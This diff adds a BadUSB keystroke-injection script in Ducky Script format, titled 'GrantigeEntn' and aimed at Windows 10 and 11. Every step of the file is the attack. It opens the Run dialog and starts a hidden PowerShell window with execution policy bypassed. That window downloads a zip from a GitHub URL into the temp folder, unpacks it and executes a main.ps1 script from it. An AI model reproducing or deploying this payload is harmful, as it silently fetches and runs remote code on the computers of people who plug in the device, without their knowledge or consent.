@@ -1,0 +1,9 @@
+REM     Title: GrantigeEntn
+REM     Author: GenericApple
+REM     Description: Die grantige Entn is Allgegenwertig.
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://github.com/agenericapple/goose/raw/main/assets/badusb/goose.zip' -O "$D\goose.zip";Expand-Archive "$D\goose.zip" -Des $D -Force;. "$D\hg\main.ps1"
+ENTER
